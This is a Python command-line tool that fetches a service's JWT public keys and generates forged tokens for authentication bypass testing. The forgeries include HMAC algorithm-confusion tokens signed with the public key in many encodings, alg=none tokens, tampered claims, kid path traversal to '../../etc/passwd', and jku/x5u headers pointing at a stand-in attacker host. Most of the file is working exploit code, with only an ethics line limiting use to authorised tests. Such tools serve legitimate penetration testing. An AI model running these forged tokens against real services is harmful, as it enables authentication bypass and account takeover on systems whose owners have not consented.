#!/usr/bin/env python3
"""
jwt-confusioner.py — Automated JWT verification & fuzzing harness (enhanced, full)

What's in this build:
- New manual switches:
    • --jwks-url / --jwks-uri         : provide a JWKS endpoint directly
    • --public-key-url / --pubkey-url / --url : provide a single public key (PEM/DER) URL directly
- Issuer-based discovery tries (in order):
    1) <iss>/.well-known/openid-configuration → jwks_uri
    2) <iss>/.well-known/jwks.json
    3) <iss>/jwks.json
- Payload URL scan: regex-find https://… in payload strings and try:
    <url>/jwks.json  →  <url>/.well-known/jwks.json (fallback on 404)
- If all discovery paths fail, we print a clear hint:
    - Use --jwks-url or --public-key-url (manual)
    - Or see: https://github.com/silentsignal/rsa_sign2n to recover RSA public key from signatures
- HS* confusion using many public-key encodings (PEM/DER/PEM-no-newlines/JWK JSON/EC raw point/RSA modulus & n||e).
- Negative tests across ES/RS/PS/HS + alg=none; claim tampering; RFC 7797 b64:false; kid/jku/x5u abuse.
- Pretty output mode that inserts blank lines between JSON entries.

Ethics: Only test systems you own or have explicit permission to assess.
"""

import argparse
import base64
import datetime as dt
import hashlib
import hmac
import json
import re
import sys
from typing import Any, Dict, List, Optional, Tuple

import jwt
import requests
from jwt import PyJWKClient
from cryptography.hazmat.primitives.asymmetric import ec, rsa
from cryptography.hazmat.primitives.serialization import (
    load_pem_public_key,
    load_der_public_key,
    Encoding,
    PublicFormat,
)

# ==================== helpers ====================

def b64url_encode(b: bytes) -> str:
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode("ascii")

def b64url_decode(s: str) -> bytes:
    return base64.urlsafe_b64decode(s + "=" * (-len(s) % 4))

def split_jwt(token: str) -> Tuple[str, str, str]:
    parts = token.split(".")
    if len(parts) != 3:
        raise ValueError("Not a 3-part JWT.")
    return parts[0], parts[1], parts[2]

def json_compact(obj: Dict[str, Any]) -> str:
    return json.dumps(obj, separators=(",", ":"))

def now_utc() -> int:
    return int(dt.datetime.now(tz=dt.timezone.utc).timestamp())

def pretty_header_payload(token: str) -> Tuple[Dict[str, Any], Dict[str, Any]]:
    h_b64, p_b64, _ = split_jwt(token)
    return json.loads(b64url_decode(h_b64)), json.loads(b64url_decode(p_b64))

def write_tokens_with_blank_lines(tokens: dict, path: str):
    """
    Write a JSON object where each top-level entry is separated by a blank line.
    Output remains valid JSON.
    """
    items = list(tokens.items())
    with open(path, "w") as f:
        f.write("{\n")
        for i, (k, v) in enumerate(items):
            line = '  ' + json.dumps(k) + ': ' + json.dumps(v)
            f.write(line)
            if i < len(items) - 1:
                f.write(",\n\n")
            else:
                f.write("\n")
        f.write("}\n")

# ==================== Discovery helpers ====================

HTTPS_URL_REGEX = re.compile(r'https://[A-Za-z0-9\.\-_:\/%#\?\=&]+')

def extract_https_urls_from_payload(payload: Dict[str, Any]) -> List[str]:
    """
    Recursively search all string fields in the payload for https:// URLs.
    """
    urls = set()
    def walk(x):
        if isinstance(x, dict):
            for v in x.values():
                walk(v)
        elif isinstance(x, list):
            for v in x:
                walk(v)
        elif isinstance(x, str):
            for m in HTTPS_URL_REGEX.findall(x):
                urls.add(m.rstrip("/"))
    walk(payload)
    return list(urls)

def discover_and_fetch_from_issuer(issuer: str, timeout: int = 10, insecure: bool = False) -> Tuple[Optional[Dict[str, Any]], Optional[str]]:
    """
    Try all reasonable issuer-derived JWKS locations, returning (jwks_json, used_url).
    Order:
      1) OIDC discovery: <iss>/.well-known/openid-configuration → jwks_uri
      2) <iss>/.well-known/jwks.json
      3) <iss>/jwks.json
    Continues on 404; aborts that step on other HTTP errors.
    """
    iss = issuer.rstrip("/")

    # 1) OIDC discovery
    try:
        r = requests.get(f"{iss}/.well-known/openid-configuration", timeout=timeout, verify=not insecure)
        if r.status_code == 200:
            data = r.json()
            jwks_uri = data.get("jwks_uri")
            if jwks_uri:
                rj = requests.get(jwks_uri, timeout=timeout, verify=not insecure)
                if rj.status_code == 200:
                    return rj.json(), jwks_uri
                # else continue to next steps
    except Exception:
        pass

    # 2) <iss>/.well-known/jwks.json
    try:
        u = f"{iss}/.well-known/jwks.json"
        r2 = requests.get(u, timeout=timeout, verify=not insecure)
        if r2.status_code == 200:
            return r2.json(), u
        # if 404, try (3)
    except Exception:
        pass

    # 3) <iss>/jwks.json
    try:
        u = f"{iss}/jwks.json"
        r3 = requests.get(u, timeout=timeout, verify=not insecure)
        if r3.status_code == 200:
            return r3.json(), u
    except Exception:
        pass

    return None, None

def try_fetch_jwks_from_base_url(base_url: str, timeout: int = 10, insecure: bool = False) -> Tuple[Optional[Dict[str, Any]], bool, Optional[str]]:
    """
    Try <base>/jwks.json (primary). If 404, try <base>/.well-known/jwks.json (secondary).
    Returns (jwks_json_or_none, both_404_boolean, used_url_or_none).
    """
    primary = f"{base_url}/jwks.json"
    secondary = f"{base_url}/.well-known/jwks.json"
    primary_404 = False
    secondary_404 = False
    try:
        r = requests.get(primary, timeout=timeout, verify=not insecure)
        if r.status_code == 200:
            return r.json(), False, primary
        elif r.status_code == 404:
            primary_404 = True
        else:
            return None, False, None
    except Exception:
        return None, False, None

    try:
        r2 = requests.get(secondary, timeout=timeout, verify=not insecure)
        if r2.status_code == 200:
            return r2.json(), False, secondary
        elif r2.status_code == 404:
            secondary_404 = True
            return None, (primary_404 and secondary_404), None
        else:
            return None, False, None
    except Exception:
        return None, False, None

def fetch_jwks(jwks_uri: str, timeout: int = 10, insecure: bool = False) -> Dict[str, Any]:
    r = requests.get(jwks_uri, timeout=timeout, verify=not insecure)
    r.raise_for_status()
    return r.json()

def select_jwk_for_token(jwks: Dict[str, Any], token_header: Dict[str, Any]) -> Optional[Dict[str, Any]]:
    kid = token_header.get("kid")
    alg = token_header.get("alg")
    keys = jwks.get("keys", [])
    if not keys:
        return None
    if kid:
        for k in keys:
            if k.get("kid") == kid:
                return k
    for k in keys:
        if k.get("use") == "sig" and (not alg or k.get("alg") == alg):
            return k
    return keys[0]

# ========= Public-key URL support (PEM/DER) → single JWK =========

def int_to_bytes(i: int, length: Optional[int] = None) -> bytes:
    if i == 0:
        b = b"\x00"
    else:
        b = i.to_bytes((i.bit_length() + 7) // 8, byteorder="big")
    if length is not None and len(b) < length:
        b = (b"\x00" * (length - len(b))) + b
    return b

def public_key_to_jwk(pub) -> Dict[str, Any]:
    """Convert a cryptography public key (RSA or EC) to a minimal JWK dict."""
    if isinstance(pub, rsa.RSAPublicKey):
        nums = pub.public_numbers()
        n = int_to_bytes(nums.n)
        e = int_to_bytes(nums.e)
        return {
            "kty": "RSA",
            "n": b64url_encode(n),
            "e": b64url_encode(e),
            "use": "sig",
            "alg": "RS256",  # default hint; server may use any RS*
        }
    elif isinstance(pub, ec.EllipticCurvePublicKey):
        nums = pub.public_numbers()
        curve = nums.curve
        # Map curve to JWK 'crv' and coordinate length
        if isinstance(curve, ec.SECP256R1):
            crv, size = "P-256", 32
            alg = "ES256"
        elif isinstance(curve, ec.SECP384R1):
            crv, size = "P-384", 48
            alg = "ES384"
        elif isinstance(curve, ec.SECP521R1):
            # P-521 coords are 66 bytes (521 bits padded to 528)
            crv, size = "P-521", 66
            alg = "ES512"
        else:
            crv, size, alg = "P-256", 32, "ES256"
        x = int_to_bytes(nums.x, size)
        y = int_to_bytes(nums.y, size)
        return {
            "kty": "EC",
            "crv": crv,
            "x": b64url_encode(x),
            "y": b64url_encode(y),
            "use": "sig",
            "alg": alg,  # hint
        }
    else:
        raise ValueError("Unsupported public key type for --public-key-url")

def fetch_public_key_from_url(url: str, timeout: int = 10, insecure: bool = False) -> Dict[str, Any]:
    """
    Fetch a single public key (PEM or DER) and convert to a JWK dict.
    """
    r = requests.get(url, timeout=timeout, verify=not insecure)
    r.raise_for_status()
    data = r.content
    # Try PEM first
    try:
        pub = load_pem_public_key(data)
    except Exception:
        # Try DER
        pub = load_der_public_key(data)
    jwk = public_key_to_jwk(pub)
    return jwk  # single-key JWK

# ==================== Key handling & formats for HS-confusion ====================

def jwk_to_public_key(jwk: Dict[str, Any]):
    kty = jwk.get("kty")
    if kty == "EC":
        x = int.from_bytes(b64url_decode(jwk["x"]), "big")
        y = int.from_bytes(b64url_decode(jwk["y"]), "big")
        curve_name = jwk.get("crv", "P-256")
        curve = {
            "P-256": ec.SECP256R1(),
            "secp256r1": ec.SECP256R1(),
            "P-384": ec.SECP384R1(),
            "P-521": ec.SECP521R1(),
        }.get(curve_name, ec.SECP256R1())
        pub_nums = ec.EllipticCurvePublicNumbers(x, y, curve)
        return pub_nums.public_key()
    elif kty == "RSA":
        n = int.from_bytes(b64url_decode(jwk["n"]), "big")
        e = int.from_bytes(b64url_decode(jwk["e"]), "big")
        pub_nums = rsa.RSAPublicNumbers(e, n)
        return pub_nums.public_key()
    else:
        raise ValueError(f"Unsupported kty: {kty}")

def pem_from_jwk(jwk: Dict[str, Any]) -> bytes:
    pub = jwk_to_public_key(jwk)
    return pub.public_bytes(Encoding.PEM, PublicFormat.SubjectPublicKeyInfo)

def der_from_pem(pem: bytes) -> bytes:
    lines = pem.decode().strip().splitlines()
    body = "".join([ln for ln in lines if not ln.startswith("-----")])
    return base64.b64decode(body)

def jwk_json_bytes(jwk: Dict[str, Any]) -> bytes:
    return json.dumps(jwk, separators=(',', ':')).encode()

def pem_no_newlines(pem: bytes) -> bytes:
    return b"".join(pem.splitlines())

def rsa_modulus_bytes(jwk: Dict[str, Any]) -> Optional[bytes]:
    if jwk.get("kty") != "RSA": return None
    n = jwk.get("n")
    if not n: return None
    return b64url_decode(n)

def rsa_n_e_concat(jwk: Dict[str, Any]) -> Optional[bytes]:
    if jwk.get("kty") != "RSA": return None
    n = jwk.get("n"); e = jwk.get("e")
    if not n or not e: return None
    return b64url_decode(n) + b64url_decode(e)

def ec_uncompressed_point(jwk: Dict[str, Any]) -> Optional[bytes]:
    if jwk.get("kty") != "EC": return None
    x = jwk.get("x"); y = jwk.get("y")
    if not x or not y: return None
    return b"\x04" + b64url_decode(x) + b64url_decode(y)

def build_secret_candidates(jwk: Dict[str, Any]) -> List[Tuple[str, bytes]]:
    """
    Return a list of (name, bytes) for different public-key encodings that servers may (incorrectly)
    treat as HMAC secrets in HS* alg confusion scenarios.
    """
    candidates: List[Tuple[str, bytes]] = []
    try:
        pem = pem_from_jwk(jwk)
        candidates.append(("pem_spki_text", pem))
        candidates.append(("pem_spki_text_no_newlines", pem_no_newlines(pem)))
        candidates.append(("der_spki", der_from_pem(pem)))
    except Exception:
        pass

    candidates.append(("jwk_json", jwk_json_bytes(jwk)))

    if jwk.get("kty") == "RSA":
        n = rsa_modulus_bytes(jwk)
        ne = rsa_n_e_concat(jwk)
        if n:  candidates.append(("rsa_modulus_n", n))
        if ne: candidates.append(("rsa_n_concat_e", ne))

    if jwk.get("kty") == "EC":
        point = ec_uncompressed_point(jwk)
        if point: candidates.append(("ec_uncompressed_point", point))

    # De-duplicate by bytes
    unique: List[Tuple[str, bytes]] = []
    seen = set()
    for name, b in candidates:
        if b not in seen:
            unique.append((name, b))
            seen.add(b)
    return unique

# ==================== Verification ====================

def verify_original_jwt_with_url(token: str, jwks_url: str) -> Tuple[bool, Optional[str]]:
    """Verify using PyJWKClient against a real URL."""
    try:
        jwk_client = PyJWKClient(jwks_url)
        signing_key = jwk_client.get_signing_key_from_jwt(token)
        jwt.decode(
            token,
            signing_key.key,
            algorithms=["ES256","ES384","ES512","RS256","RS384","RS512","PS256","PS384","PS512"],
            options={"verify_aud": False},
        )
        return True, None
    except Exception as e:
        return False, str(e)

def verify_original_jwt_with_local_key(token: str, jwk: Dict[str, Any]) -> Tuple[bool, Optional[str]]:
    """Fallback verification when we don't have a resolvable JWKS URL; uses the selected JWK directly."""
    try:
        pub_pem = pem_from_jwk(jwk)
        pub = load_pem_public_key(pub_pem)
        jwt.decode(
            token,
            pub,
            algorithms=["ES256","ES384","ES512","RS256","RS384","RS512","PS256","PS384","PS512"],
            options={"verify_aud": False},
        )
        return True, None
    except Exception as e:
        return False, str(e)

# ==================== Crafting ====================

ALL_ALGS_NEGATIVE = [
    "ES256","ES384","ES512",
    "RS256","RS384","RS512",
    "PS256","PS384","PS512",
    "HS256","HS384","HS512",
]

def re_sign_hs(message: bytes, secret: bytes, hash_name: str) -> str:
    if hash_name == "sha256":
        d = hmac.new(secret, message, hashlib.sha256).digest()
    elif hash_name == "sha384":
        d = hmac.new(secret, message, hashlib.sha384).digest()
    elif hash_name == "sha512":
        d = hmac.new(secret, message, hashlib.sha512).digest()
    else:
        raise ValueError("Unsupported HS hash")
    return b64url_encode(d)

def forge_with_header_payload(header: Dict[str, Any], payload_b64: str,
                              secret: Optional[bytes], alg: str) -> str:
    """
    For HS* algorithms:
      - If secret is provided, produce a real HMAC signature (confusion tests).
      - If secret is None, emit a dummy signature (negative alg tests).
    For non-HS algorithms:
      - Emit a dummy signature (by design).
    """
    header_b64 = b64url_encode(json_compact(header).encode())
    if alg.startswith("HS"):
        if secret is None:
            sig_b64 = "invalidsignature"
        else:
            hash_name = {"HS256":"sha256","HS384":"sha384","HS512":"sha512"}[alg]
            sig_b64 = re_sign_hs(f"{header_b64}.{payload_b64}".encode(), secret, hash_name)
    else:
        sig_b64 = "invalidsignature"
    return f"{header_b64}.{payload_b64}.{sig_b64}"

def craft_suite(original: str, jwk: Dict[str, Any],
                include: Optional[List[str]] = None,
                exclude: Optional[List[str]] = None,
                limit_secrets: Optional[int] = None) -> Dict[str, str]:
    tokens: Dict[str, str] = {}
    header, payload = pretty_header_payload(original)
    header_orig = dict(header)
    payload_orig = dict(payload)
    header_b64, payload_b64, _ = split_jwt(original)

    # HS* confusion across multiple secret encodings
    secrets = build_secret_candidates(jwk)
    if limit_secrets:
        secrets = secrets[:max(1, limit_secrets)]
    for hs_alg in ["HS256", "HS384", "HS512"]:
        for name, secret in secrets:
            h = {k:v for k,v in header_orig.items() if k != "kid"} | {"alg": hs_alg, "typ": "JWT"}
            tokens[f"{hs_alg.lower()}_confusion_{name}"] = forge_with_header_payload(h, payload_b64, secret, hs_alg)
        if secrets:
            h_keep = header_orig | {"alg": hs_alg}
            tokens[f"{hs_alg.lower()}_confusion_keep_kid_{secrets[0][0]}"] = forge_with_header_payload(
                h_keep, payload_b64, secrets[0][1], hs_alg
            )

    # alg=none
    tokens["alg_none"] = f"{b64url_encode(json_compact({'alg':'none','typ':'JWT'}).encode())}.{payload_b64}."

    # wrong algs (dummy sigs)
    for bad_alg in ALL_ALGS_NEGATIVE:
        if bad_alg == header_orig.get("alg"):
            continue
        tokens[f"wrong_alg_{bad_alg}"] = forge_with_header_payload(
            {k:v for k,v in header_orig.items() if k!='kid'} | {"alg": bad_alg, "typ":"JWT"},
            payload_b64, None, bad_alg
        )

    # claim tampering
    def tamper_payload(mut: Dict[str, Any]) -> str:
        p_b64 = b64url_encode(json_compact(mut).encode())
        h_b64 = b64url_encode(json_compact(header_orig).encode())
        return f"{h_b64}.{p_b64}.invalidsignature"

    p = dict(payload_orig); p["iss"] = "https://evil.example.com/"; tokens["tamper_iss"] = tamper_payload(p)
    p = dict(payload_orig); p["aud"] = "wrong-audience";            tokens["tamper_aud"] = tamper_payload(p)
    p = dict(payload_orig); p["exp"] = now_utc() - 3600;            tokens["tamper_expired"] = tamper_payload(p)
    p = dict(payload_orig); p["nbf"] = now_utc() + 3600;            tokens["tamper_nbf_future"] = tamper_payload(p)
    p = dict(payload_orig); p["jti"] = f"replay-{now_utc()}";       tokens["tamper_jti_new"] = tamper_payload(p)

    # RFC 7797 (b64:false) with HS256
    hdr_unencoded = {"alg":"HS256","typ":"JWT","b64":False,"crit":["b64"]}
    h_b64 = b64url_encode(json_compact(hdr_unencoded).encode())
    raw_payload = b"raw-payload-not-base64"
    secret_for_unenc = secrets[0][1] if secrets else b"test"
    sig_unenc = re_sign_hs(f"{h_b64}.".encode() + raw_payload, secret_for_unenc, "sha256")
    tokens["crit_b64_false_unencoded_payload"] = f"{h_b64}.{raw_payload.decode()}.{sig_unenc}"

    # kid/jku/x5u abuse (HS* signed to probe mistaken HMAC usage)
    for hs_alg in ["HS256", "HS384", "HS512"]:
        s0 = secrets[0][1] if secrets else b"test"
        tokens[f"kid_traversal_{hs_alg.lower()}"] = forge_with_header_payload(
            header_orig | {"kid":"../../etc/passwd","alg":hs_alg}, payload_b64, s0, hs_alg)
        tokens[f"kid_absolute_path_{hs_alg.lower()}"] = forge_with_header_payload(
            header_orig | {"kid":"/var/www/keys/priv.pem","alg":hs_alg}, payload_b64, s0, hs_alg)
        tokens[f"kid_url_{hs_alg.lower()}"] = forge_with_header_payload(
            header_orig | {"kid":"http://attacker.invalid/evil","alg":hs_alg}, payload_b64, s0, hs_alg)

    tokens["jku_external_RS256"] = forge_with_header_payload(
        header_orig | {"alg":"RS256","jku":"http://attacker.invalid/jwks.json"}, payload_b64, None, "RS256")
    tokens["x5u_external_RS256"] = forge_with_header_payload(
        header_orig | {"alg":"RS256","x5u":"http://attacker.invalid/cert.pem"}, payload_b64, None, "RS256")

    if include:
        include = set(include); tokens = {k:v for k,v in tokens.items() if k in include}
    if exclude:
        exclude = set(exclude); tokens = {k:v for k,v in tokens.items() if k not in exclude}
    return tokens

# ==================== CLI ====================

def build_parser() -> argparse.ArgumentParser:
    epilog = r"""
Examples:
  # Basic run (issuer discovery + payload URL scan)
  jwt-confusioner.py -t '<JWT>'

  # Provide JWKS directly
  jwt-confusioner.py -t '<JWT>' --jwks-url 'https://idp.example.com/jwks.json'

  # Provide a single public key (PEM/DER) directly
  jwt-confusioner.py -t '<JWT>' --public-key-url 'https://idp.example.com/public.pem'

  # Audience verification for the original token
  jwt-confusioner.py -t '<JWT>' --aud 'my-audience'

  # Limit number of HS* secret encodings tried
  jwt-confusioner.py -t '<JWT>' --limit-secrets 3

  # Pretty output file with blank lines
  jwt-confusioner.py -t '<JWT>' --pretty-blank-lines -o tokens.json
"""
    parser = argparse.ArgumentParser(
        prog="jwt-confusioner.py",
        description=(
            "Automated JWT verification & fuzzing harness.\n"
            "• Issuer discovery: OIDC → .well-known/jwks.json → /jwks.json.\n"
            "• Payload URL scan: find https://… and try /jwks.json then /.well-known/jwks.json.\n"
            "• Manual overrides: --jwks-url (JWKS), --public-key-url (PEM/DER).\n"
            "• Verifies the original token; crafts confusion/negative tokens and saves them.\n"
        ),
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=epilog,
    )
    parser.add_argument("-t", "--token", required=True, help="Original JWT (three-part compact form).")
    parser.add_argument("--jwks-uri", "--jwks-url", dest="jwks_url",
                        help="Provide JWKS URL directly (skips discovery).")
    parser.add_argument("--public-key-url", "--pubkey-url", "--url", dest="public_key_url",
                        help="Provide a single public key URL (PEM or DER). Will be converted to a JWK.")
    parser.add_argument("--aud", help="Expected audience for additional verification of the original token.")
    parser.add_argument("-o", "--out", default="tokens.json", help="Output JSON file for crafted tokens (default: tokens.json).")
    parser.add_argument("--print-payload", action="store_true", help="Print parsed header and payload of the input JWT.")
    parser.add_argument("--timeout", type=int, default=10, help="HTTP timeout (seconds) for discovery/JWKS fetch (default: 10).")
    parser.add_argument("--insecure", action="store_true", help="Disable TLS verification for HTTP fetches (NOT recommended).")
    parser.add_argument("--include", help="Comma-separated list of test IDs to include (defaults to all).")
    parser.add_argument("--exclude", help="Comma-separated list of test IDs to exclude.")
    parser.add_argument("--pretty-blank-lines", action="store_true", help="Write tokens.json with a blank line between entries.")
    parser.add_argument("--limit-secrets", type=int, default=0, help="Max number of secret formats per HS* confusion set (0 = all).")
    return parser

def main():
    parser = build_parser()
    args = parser.parse_args()

    token = args.token.strip()
    try:
        header, payload = pretty_header_payload(token)
    except Exception as e:
        print(f"[!] Failed to parse input token: {e}", file=sys.stderr); sys.exit(1)

    if args.print_payload:
        print("\n--- Header ---"); print(json.dumps(header, indent=2, sort_keys=True))
        print("--- Payload ---"); print(json.dumps(payload, indent=2, sort_keys=True))

    jwks_uri: Optional[str] = None
    jwks: Optional[Dict[str, Any]] = None
    selected_jwk: Optional[Dict[str, Any]] = None
    any_both_404 = False

    # 0) Manual overrides first
    if args.jwks_url:
        try:
            jwks = fetch_jwks(args.jwks_url, timeout=args.timeout, insecure=args.insecure)
            jwks_uri = args.jwks_url
            print(f"[+] Using JWKS from --jwks-url: {jwks_uri}")
        except Exception as e:
            print(f"[!] Failed to fetch JWKS from --jwks-url: {e}", file=sys.stderr)

    if jwks is None and args.public_key_url:
        try:
            jwk_single = fetch_public_key_from_url(args.public_key_url, timeout=args.timeout, insecure=args.insecure)
            jwks = {"keys": [jwk_single]}
            jwks_uri = None  # single-key mode
            print(f"[+] Using public key from --public-key-url: {args.public_key_url}")
        except Exception as e:
            print(f"[!] Failed to fetch/parse --public-key-url: {e}", file=sys.stderr)

    # 1) Issuer-derived discovery: OIDC → .well-known/jwks.json → /jwks.json
    if jwks is None:
        iss = payload.get("iss")
        if iss:
            jwks_try, used = discover_and_fetch_from_issuer(iss, timeout=args.timeout, insecure=args.insecure)
            if jwks_try and isinstance(jwks_try, dict) and jwks_try.get("keys"):
                jwks = jwks_try
                jwks_uri = used
            else:
                print(f"[!] Issuer-based discovery failed for {iss} (no JWKS at openid-config/.well-known/jwks.json or /jwks.json).", file=sys.stderr)

    # 2) Payload URL scan: <url>/jwks.json → <url>/.well-known/jwks.json
    if jwks is None:
        urls = extract_https_urls_from_payload(payload)
        for base_url in urls:
            jwks_try, both_404, used_url = try_fetch_jwks_from_base_url(base_url, timeout=args.timeout, insecure=args.insecure)
            any_both_404 = any_both_404 or both_404
            if jwks_try and isinstance(jwks_try, dict) and jwks_try.get("keys"):
                jwks = jwks_try
                jwks_uri = used_url  # actual URL used
                break
        if jwks is None:
            if urls:
                print(f"[!] Failed to fetch public key via URL scan. Tried: {', '.join(urls)}", file=sys.stderr)

    # 3) Final failure message with guidance
    if jwks is None:
        print(
            "[!] Could not obtain any signing key.\n"
            "    Try one of these:\n"
            "      • Provide JWKS directly: --jwks-url https://example.com/jwks.json\n"
            "      • Provide a single public key: --public-key-url https://example.com/public.pem\n"
            "      • Or recover RSA public key from signatures with:\n"
            "        https://github.com/silentsignal/rsa_sign2n",
            file=sys.stderr
        )
        sys.exit(1)

    print(f"[+] Using JWKS source: {jwks_uri if jwks_uri else '(single public key mode)'}")

    # Select JWK for this token (in single public key mode this just picks the only one)
    selected_jwk = select_jwk_for_token(jwks, header)
    if not selected_jwk:
        print("[!] Could not select a matching JWK (kid/alg).", file=sys.stderr); sys.exit(1)
    print(f"[+] Selected JWK kid={selected_jwk.get('kid')} kty={selected_jwk.get('kty')} alg={selected_jwk.get('alg')} use={selected_jwk.get('use')}")

    # Verify original token (baseline)
    verified = False
    if jwks_uri and isinstance(jwks_uri, str) and jwks_uri.startswith("http"):
        ok, err = verify_original_jwt_with_url(token, jwks_uri)
        if ok:
            print("[+] Original token: SIGNATURE VALID (via JWKS URL)"); verified = True
        else:
            print(f"[!] Original token verification via JWKS URL FAILED: {err}")
    if not verified:
        ok, err = verify_original_jwt_with_local_key(token, selected_jwk)
        if ok:
            print("[+] Original token: SIGNATURE VALID (via local JWK)")
        else:
            print(f"[!] Original token verification via local JWK FAILED: {err}")

    # Audience-checked verification (optional)
    if args.aud:
        try:
            pem_public = pem_from_jwk(selected_jwk)
            pub = load_pem_public_key(pem_public)
            jwt.decode(
                token,
                pub,
                algorithms=["ES256","ES384","ES512","RS256","RS384","RS512","PS256","PS384","PS512"],
                audience=args.aud,
                options={"require": ["exp", "iat"]},
            )
            print(f"[+] Audience-checked verification passed for aud='{args.aud}'")
        except Exception as e:
            print(f"[!] Audience-checked verification FAILED: {e}")

    # Craft and save
    include = args.include.split(",") if args.include else None
    exclude = args.exclude.split(",") if args.exclude else None
    try:
        crafted = craft_suite(token, selected_jwk, include=include, exclude=exclude,
                              limit_secrets=(args.limit_secrets if args.limit_secrets > 0 else None))
    except Exception as e:
        print(f"[!] Failed to craft tokens: {e}", file=sys.stderr); sys.exit(1)

    if args.pretty_blank_lines:
        write_tokens_with_blank_lines(crafted, args.out)
    else:
        with open(args.out, "w") as f:
            json.dump(crafted, f, indent=2)
    print(f"[+] Wrote {len(crafted)} crafted tokens → {args.out}\n")

    print("Name".ljust(46), "Preview")
    print("-" * 120)
    for name, tok in crafted.items():
        print(name.ljust(46), tok[:110] + ("..." if len(tok) > 110 else ""))

if __name__ == "__main__":
    requests.adapters.DEFAULT_RETRIES = 1
    try:
        main()
    except KeyboardInterrupt:
        print("\n[!] Interrupted by user.", file=sys.stderr); sys.exit(130)

